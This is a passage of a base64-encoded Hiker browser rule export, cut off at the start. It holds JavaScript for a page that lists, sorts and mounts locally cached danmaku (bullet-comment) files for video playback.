biAgICAgICAgICAgICAgICB9XFxcXG5cXFxcbiAgICAgICAgICAgICAgICBpZiAoY21wICE9PSAwKSB7XFxcXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBjbXA7XFxcXG4gICAgICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgfVxcXFxuICAgICAgICAgICAgbGV0IGxlbmd0aENtcCA9IHNwbGl0MS5sZW5ndGggLSBzcGxpdDIubGVuZ3RoO1xcXFxuICAgICAgICAgICAgLy8gaWYgKGxlbmd0aENtcCAhPT0gMCkgbGVuZ3RoQ21wID0gbGVuZ3RoQ21wID4gMCA/IC0xIDogMTtcXFxcbiAgICAgICAgICAgIHJldHVybiBsZW5ndGhDbXA7XFxcXG4gICAgICAgIH1cXFxcbiAgICAgICAgcmV0dXJuIG5hbWVDb21wYXJlO1xcXFxuICAgIH1cXFxcbn1cXFwifSx7XFxcImNvbF90eXBlXFxcIjpcXFwibW92aWVfM1xcXCIsXFxcIm5hbWVcXFwiOlxcXCLlvLnluZXmibnph4/mjILovb1cXFwiLFxcXCJwYXRoXFxcIjpcXFwiZG1Nb3VudFxcXCIsXFxcInJ1bGVcXFwiOlxcXCJqczpcXFxcbmxldCBkID0gW107XFxcXG5kLnB1c2goe1xcXFxuICAgIHRpdGxlOiBcXFxcXFxcIua4heepuuaMgui9veWIl+ihqFxcXFxcXFwiLFxcXFxuICAgIHVybDogJChcXFxcXFxcIm5vTG9hZGluZyNcXFxcXFxcIikubGF6eVJ1bGUoKCk9PntcXFxcbiAgICAgICAgY2xlYXJNeVZhcihcXFxcXFxcImRtbGlzdFxcXFxcXFwiKTtcXFxcbiAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcXFxuICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCI7XFxcXG4gICAgfSksXFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF8yXFxcXFxcXCIsXFxcXG59KTtcXFxcbmQucHVzaCh7XFxcXG4gICAgdGl0bGU6IFxcXFxcXFwi5LiL6L295by55bmVXFxcXFxcXCIsXFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF8yXFxcXFxcXCIsXFxcXG4gICAgdXJsOiBcXFxcXFxcImhpa2VyOi8vcGFnZS9sb2FkRG0jbm9IaXN0b3J5IyNub1JlY29yZEhpc3RvcnkjXFxcXFxcXCIsXFxcXG4gICAgZXh0cmE6e1xcXFxuICAgICAgICBvbmx5RG93bmxvYWQgOiB0cnVlXFxcXG4gICAgfVxcXFxufSk7XFxcXG5kLnB1c2goe1xcXFxuICAgIGNvbF90eXBlOiBcXFxcXFxcImxpbmVfYmxhbmtcXFxcXFxcIlxcXFxufSk7XFxcXG5kLnB1c2goe1xcXFxuICAgIHRpdGxlOiBcXFxcXFxcIuKAnOKAnOKAneKAnVxcXFxcXFwiICsgXFxcXFxcXCLlt7LmjILovb1cXFxcXFxcIi5iaWcoKSxcXFxcbiAgICB1cmw6ICQoXFxcXFxcXCIjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZSgoKT0+e1xcXFxuICAgICAgICBsZXQgZG1saXN0ID0gc3RvcmFnZTAuZ2V0TXlWYXIoXFxcXFxcXCJkbWxpc3RcXFxcXFxcIiwgW10pO1xcXFxuICAgICAgICBsZXQgYWxpVXRpbD0kLnJlcXVpcmUoXFxcXFxcXCJhbGlVdGlsXFxcXFxcXCIpO1xcXFxuICAgICAgICBsZXQgbmFtZUNvbXBhcmU9YWxpVXRpbC5nZXROYW1lc1NvcnQoKTtcXFxcbiAgICAgICAgZG1saXN0LnNvcnQoKGEsYik9Pm5hbWVDb21wYXJlKGEsYikpO1xcXFxuICAgICAgICBzdG9yYWdlMC5wdXRNeVZhcihcXFxcXFxcImRtbGlzdFxcXFxcXFwiLCBkbWxpc3QpO1xcXFxuICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxcXG4gICAgICAgIHJldHVybiBcXFxcXFxcInRvYXN0Oi8v5o6S5bqP5a6M5oiQXFxcXFxcXCI7XFxcXG4gICAgfSksXFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF9jZW50ZXJfMVxcXFxcXFwiXFxcXG59KTtcXFxcbmxldCBmaWxlID0gJC5yZXF1aXJlKFxcXFxcXFwiaHR0cHM6Ly9oaWtlcmZhbnMuY29tL3dlaXN5ci9qcy9maWxlLmpzXFxcXFxcXCIpXFxcXG5sZXQgZG1saXN0ID0gc3RvcmFnZTAuZ2V0TXlWYXIoXFxcXFxcXCJkbWxpc3RcXFxcXFxcIiwgW10pO1xcXFxuXFxcXG5mb3IgKGxldCBpID0gMDsgaSA8IGRtbGlzdC5sZW5ndGg7IGkrKykge1xcXFxuICAgIGxldCBkbW5hbWUgPSBkbWxpc3RbaV07XFxcXG4gICAgZC5wdXNoKHtcXFxcbiAgICAgICAgdGl0bGU6IFxcXFxcXFwiW1xcXFxcXFwiICsgKGkgKyAxKSArIFxcXFxcXFwiXVxcXFxcXFxcdFxcXFxcXFwiICsgZG1uYW1lLFxcXFxuICAgICAgICB1cmw6ICQoXFxcXFxcXCIjbm9Mb2FkaW5nI1xcXFxcXFwiKS5sYXp5UnVsZSgoaSkgPT4ge1xcXFxuICAgICAgICAgICAgbGV0IGRtbGlzdCA9IHN0b3JhZ2UwLmdldE15VmFyKFxcXFxcXFwiZG1saXN0XFxcXFxcXCIsIFtdKTtcXFxcbiAgICAgICAgICAgIGRtbGlzdC5zcGxpY2UoaSwgMSk7XFxcXG4gICAgICAgICAgICBzdG9yYWdlMC5wdXRNeVZhcihcXFxcXFxcImRtbGlzdFxcXFxcXFwiLCBkbWxpc3QpO1xcXFxuICAgICAgICAgICAgcmVmcmVzaFBhZ2UoZmFsc2UpO1xcXFxuICAgICAgICAgICAgcmV0dXJuIFxcXFxcXFwiaGlrZXI6Ly9lbXB0eVxcXFxcXFwiO1xcXFxuICAgICAgICB9LCBpKSxcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF8xXFxcXFxcXCJcXFxcbiAgICB9KTtcXFxcbn1cXFxcbmQucHVzaCh7XFxcXG4gICAgY29sX3R5cGU6IFxcXFxcXFwibGluZV9ibGFua1xcXFxcXFwiXFxcXG59KTtcXFxcbmQucHVzaCh7XFxcXG4gICAgdGl0bGU6IFxcXFxcXFwi4oCc4oCc4oCd4oCdXFxcXFxcXCIgKyBcXFxcXFxcIuacrOWcsOacquaMgui9vVxcXFxcXFwiLmJpZygpLFxcXFxuICAgIHVybDpcXFxcXFxcImhpa2VyOi8vZW1wdHlcXFxcXFxcIixcXFxcbiAgICBjb2xfdHlwZTogXFxcXFxcXCJ0ZXh0X2NlbnRlcl8xXFxcXFxcXCJcXFxcbn0pO1xcXFxubGV0IGRtTGlzdFBhdGggPSBnZXRQYXRoKFxcXFxcXFwiaGlrZXI6Ly9maWxlcy9jYWNoZS9kYW5tdS9cXFxcXFxcIikuc2xpY2UoNyk7XFxcXG5sZXQgZmlsZUxpc3QgPSBmaWxlLmdldEZpbGVQYXRoKGRtTGlzdFBhdGgsIFxcXFxcXFwiZmlsZVxcXFxcXFwiLCBcXFxcXFxcIi54bWxcXFxcXFxcIik7XFxcXG5cXFxcbmZvciAobGV0IGkgPSAwOyBpIDwgZmlsZUxpc3QubGVuZ3RoOyBpKyspIHtcXFxcbiAgICBsZXQgZG1maWxlID0gZmlsZUxpc3RbaV07XFxcXG4gICAgaWYgKGRtbGlzdC5pbmNsdWRlcyhkbWZpbGUubmFtZSkpIGNvbnRpbnVlO1xcXFxuICAgIGQucHVzaCh7XFxcXG4gICAgICAgIHRpdGxlOiBkbWZpbGUubmFtZSxcXFxcbiAgICAgICAgdXJsOiAkKFxcXFxcXFwiI25vTG9hZGluZyNcXFxcXFxcIikubGF6eVJ1bGUoKHBhdGgpID0+IHtcXFxcbiAgICAgICAgICAgIGxldCBkbWxpc3QgPSBzdG9yYWdlMC5nZXRNeVZhcihcXFxcXFxcImRtbGlzdFxcXFxcXFwiLCBbXSk7XFxcXG4gICAgICAgICAgICBkbWxpc3QucHVzaChwYXRoKTtcXFxcbiAgICAgICAgICAgIHN0b3JhZ2UwLnB1dE15VmFyKFxcXFxcXFwiZG1saXN0XFxcXFxcXCIsIGRtbGlzdCk7XFxcXG4gICAgICAgICAgICByZWZyZXNoUGFnZShmYWxzZSk7XFxcXG4gICAgICAgICAgICByZXR1cm4gXFxcXFxcXCJoaWtlcjovL2VtcHR5XFxcXFxcXCI7XFxcXG4gICAgICAgIH0sIGRtZmlsZS5uYW1lKSxcXFxcbiAgICAgICAgY29sX3R5cGU6IFxcXFxcXFwidGV4dF8xXFxcXFxcXCJcXFxcbiAgICB9KTtcXFxcbn1cXFxcblxcXFxuc2V0UmVzdWx0KGQpO1xcXCJ9XVwiLFwicHJveHlcIjpcIlwifSIsInBpY1VybCI6InVuZGVmaW5lZCIsInRpdGxlIjoi5LmQ5ri45Y6fIn0=
